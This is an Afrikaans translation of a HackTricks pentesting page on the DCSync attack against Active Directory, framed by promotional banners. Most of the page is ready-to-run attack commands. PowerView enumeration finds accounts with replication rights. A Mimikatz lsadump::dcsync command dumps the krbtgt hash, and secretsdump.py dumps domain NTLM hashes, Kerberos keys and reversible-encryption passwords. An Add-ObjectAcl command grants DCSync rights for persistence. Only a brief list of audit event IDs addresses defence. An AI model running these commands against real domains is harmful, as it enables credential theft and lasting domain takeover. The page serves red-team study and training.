# DCSync

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en **outomatiese werksvloei** te bou wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## DCSync

Die **DCSync**-toestemming impliseer dat hierdie toestemmings oor die domein self beskik word: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** en **Replicating Directory Changes In Filtered Set**.

**Belangrike Notas oor DCSync:**

* Die **DCSync-aanval simuleer die gedrag van 'n Domeinbeheerder en vra ander Domeinbeheerders om inligting te repliseer** deur die Directory Replication Service Remote Protocol (MS-DRSR) te gebruik. Omdat MS-DRSR 'n geldige en noodsaaklike funksie van Active Directory is, kan dit nie afgeskakel of gedeaktiveer word nie.
* Standaard het slegs die **Domeinadministrateurs, Ondernemingsadministrateurs, Administrateurs, en Domeinbeheerders**-groepe die nodige voorregte.
* As enige rekeningwagwoorde met omkeerbare enkripsie gestoor word, is daar 'n opsie in Mimikatz beskikbaar om die wagwoord in die teks duidelik terug te gee

### Enumerasie

Kyk wie hierdie toestemmings het deur `powerview` te gebruik:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Exploiteer Lokaal
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploiteer op afstand
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` genereer 3 lêers:

* een met die **NTLM-hashes**
* een met die **Kerberos-sleutels**
* een met die oop teks wagwoorde van die NTDS vir enige rekeninge wat ingestel is met [**omkeerbare versleuteling**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) geaktiveer. Jy kan gebruikers met omkeerbare versleuteling kry met

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Volharding

As jy 'n domein-admin is, kan jy hierdie regte aan enige gebruiker toeken met behulp van `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Dan kan jy **kontroleer of die gebruiker korrek toegewys is** die 3 voorregte deur na hulle te soek in die uitset van (jy behoort die name van die voorregte binne die "ObjectType" veld te kan sien):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Versagting

* Sekuriteitsgebeurtenis ID 4662 (Ouditbeleid vir voorwerp moet geaktiveer wees) - 'n Operasie is uitgevoer op 'n voorwerp
* Sekuriteitsgebeurtenis ID 5136 (Ouditbeleid vir voorwerp moet geaktiveer wees) - 'n Gidsdiensvoorwerp is gewysig
* Sekuriteitsgebeurtenis ID 4670 (Ouditbeleid vir voorwerp moet geaktiveer wees) - Toestemmings op 'n voorwerp is verander
* AD ACL-skandeerder - Skep en vergelyk skepverslae van ACL's. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Verwysings

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **outomatiseer werkafvloei** aangedryf deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
